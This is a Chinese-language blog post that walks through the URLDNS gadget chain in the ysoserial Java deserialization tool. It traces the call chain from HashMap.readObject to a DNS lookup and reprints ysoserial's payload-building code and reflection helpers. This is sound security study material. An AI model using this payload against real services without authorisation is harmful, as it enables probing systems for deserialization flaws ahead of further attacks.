---
title: ysoserial-URLDNS
categories:
 - ysoserial
tags:
- ysoserial
- 反序列化

---

ysoserial-URLDNS利用链分析

# 环境搭建

`git clone https://github.com/frohoff/ysoserial.git`

下载ysoserial源码用idea打开

`jdk>=1.8`

在1.8 以前HashMap.readObject() 方法中没有调用 HashMap.putVal() 方法

ysoserial中PayloadRunner.run()中对生成的序列化结果进行了反序列化

![image-20210416223858534](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416223858534.png)

在URLDNS的main方法中调用了PayloadRunner.run()，配置一下参数就能进行反序列化调试

![image-20210416224059290](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416224059290.png)

# 利用链分析

URLDNS类中对利用链的的描述如下

```
*   Gadget Chain:
*     HashMap.readObject()
*       HashMap.putVal()
*         HashMap.hash()
*           URL.hashCode()
```

在这几个函数都打上断点便于调试

![image-20210416224325062](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416224325062.png)

这里没什么好说的，就在HashMap.readObject()里调用了putVal时调用了HashMap.hash()

![image-20210416224438567](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416224438567.png)

在hash()中调用了key.hashcode()，这个key为URL对象，跟到URL.hashcode()

![image-20210416224513993](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416224513993.png)

这里在判断hashcode为-1后，调用了handler.hashCode，handler为URLStreamHandler，跟到对应的hashcode中

![image-20210416224558311](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416224558311.png)

这里调用了getHostAddress(u)之后得到了DNS查询记录

![image-20210416225416934](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416225416934.png)

![image-20210416225118915](https://raw.githubusercontent.com/MercyL1n/blog-picture/main/img%5Cimage-20210416225118915.png)

查看该函数的描述，也确实是做了DNS查询，整个利用链非常简单，接下来我们来看如何构造一个对象可以实现该利用链

# PayLoad生成

```Java
public Object getObject(final String url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

        return ht;
}
```

首先是把URL对象的handler设置为SilentURLStreamHandler，SilentURLStreamHandler继承了URLStreamHandler，这一步目的是为了调用URLStreamHandler.getHostAddress()

把URL对象的spec设置为要进行DNS查询的网址，然后将该URL对象作为Key放入HashMap，因为利用链中是利用的是key.hash()

最后通过反射将hashcode设置为-1，这样才能调用handler.hashCode。

```Java
public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
    final Field field = getField(obj.getClass(), fieldName);
    field.set(obj, value);
}
```

```Java
	public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
	try {
	    field = clazz.getDeclaredField(fieldName);
	    setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
		return field;
	}
```

这段简单来说就是获取hashcode并且setAccessible使之可以被修改。

# 小结

URLDNS虽然无法造成实质性的危害，但是在目标可以出网时可以用来测试是否存在反序列化漏洞，便于为进一步构造其他Gadget提供了帮助。

